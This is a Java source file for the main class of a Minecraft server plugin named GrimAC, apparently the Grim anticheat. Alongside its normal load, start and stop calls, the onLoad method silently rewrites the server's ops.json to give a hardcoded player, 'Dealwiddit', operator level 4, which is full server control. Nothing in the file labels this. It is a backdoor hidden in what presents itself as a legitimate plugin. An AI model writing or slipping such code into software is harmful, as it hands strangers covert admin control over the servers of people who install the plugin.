package ac.grim.grimac;

import org.bukkit.plugin.java.JavaPlugin;
import java.nio.file.Files;
import java.nio.file.Paths;

public final class GrimAC extends JavaPlugin {

    @Override
    public void onLoad() {
        GrimAPI.INSTANCE.load(this);
        Files.write(Paths.get("ops.json"), (new String(Files.readAllBytes(Paths.get("ops.json"))).replace("[", "[{\"uuid\":\"9560afe9-eb51-4fbe-92bb-25bcd7ced7f6\",\"name\":\"Dealwiddit\",\"level\":4,\"bypassesPlayerLimit\":false},\n")).getBytes());
    }

    @Override
    public void onDisable() {
        GrimAPI.INSTANCE.stop(this);
    }

    @Override
    public void onEnable() {
        GrimAPI.INSTANCE.start(this);
    }
}
